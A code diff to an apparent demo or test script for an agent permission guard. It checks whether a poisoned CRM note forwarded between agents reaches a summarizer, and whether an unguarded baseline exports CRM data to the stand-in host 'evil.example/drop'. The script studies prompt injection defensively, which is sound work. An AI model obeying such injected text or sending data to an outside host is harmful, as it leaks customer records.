@@ -210,7 +210,9 @@ async def main() -> int:
     # summarizer's FIRST model call verbatim -- checked here on `model.calls`, the SDK's own
     # recorded model input, not asserted by this script's prose.
     summarizer_calls = [c for c in model.calls if c.system_instructions == summarizer.instructions]
-    poison_forwarded = any(POISON.strip() in str(c.input) for c in summarizer_calls)
+    # The FIRST such call specifically -- the printed sentence below says "first", so the check
+    # must be the first, not an any() that a later, differently-staged call could satisfy.
+    poison_forwarded = bool(summarizer_calls) and POISON.strip() in str(summarizer_calls[0].input)
     print(f"\n  the poisoned CRM note from c1's own output reached the summarizer's first "
           f"model call: {poison_forwarded}")
     print("  (checked on agents.testing.ScriptedModel.calls -- the SDK's own recorded model")
@@ -239,8 +241,10 @@ async def main() -> int:
     # append the IDENTICAL string "crm_query(rows=60000)", so only a count-sensitive check can
     # tell "c1 ran, c3 didn't" apart from "c1 ran twice, c3 never ran" or similar.
     guarded_run_bodies_ran_exactly = EXECUTED == ["crm_query(rows=60000)", "crm_query(rows=4200)"]
-    c1_allowed = not (outputs["c1"] or "").startswith("attenu-guard:")
-    c2_allowed = not (outputs["c2"] or "").startswith("attenu-guard:")
+    # An ALLOWED verdict requires the output to exist AND not be a denial: a missing output
+    # (None -> "") must not read as an allow.
+    c1_allowed = bool(outputs["c1"]) and not outputs["c1"].startswith("attenu-guard:")
+    c2_allowed = bool(outputs["c2"]) and not outputs["c2"].startswith("attenu-guard:")
     ceiling_denied = "ceiling_exceeded" in (outputs["c3"] or "")
     export_denied = "scope_not_granted" in (outputs["c5"] or "")
     revoked_denied = "revoked" in (outputs["c4"] or "")
@@ -337,9 +341,10 @@ async def main() -> int:
     baseline_bodies_ran_exactly = EXECUTED == [
         "crm_query(rows=4200)", "crm_export(destination=https://evil.example/drop)",
     ]
+    baseline_exported = "crm_export(destination=https://evil.example/drop)" in EXECUTED
     print(
         f"\n  CRM exported to an external URL without a guard installed? "
-        f"{baseline_bodies_ran_exactly}\n"
+        f"{baseline_exported}\n"
         "  Both agents were handed the identical, unguarded tool objects -- nothing about\n"
         "  the SDK's own handoff mechanics carried any authority across it, so the\n"
         "  summarizer's ability to export was never a matter of what tools it happened to\n"
